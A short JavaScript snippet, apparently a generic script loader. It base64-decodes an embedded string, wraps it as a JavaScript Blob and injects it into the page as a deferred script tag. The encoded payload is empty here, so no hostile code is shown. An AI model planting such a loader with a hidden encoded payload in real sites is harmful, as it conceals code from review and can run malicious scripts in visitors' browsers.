(function(){
  
  try{
    var _b = "";
    var _s = atob(_b);
    var _len = _s.length;
    var _arr = new Uint8Array(_len);
    for(var _i=0; _i<_len; _i++) _arr[_i] = _s.charCodeAt(_i);
    var _blob = new Blob([_arr], {type: 'application/javascript'});
    var _url = URL.createObjectURL(_blob);
    var _sc = document.createElement('script');
    _sc.src = _url;
    _sc.defer = true;
    var _parent = document.head || document.documentElement || document.body;
    _parent.appendChild(_sc);
  }catch(e){
    console.error('loader error', e);
  }
})();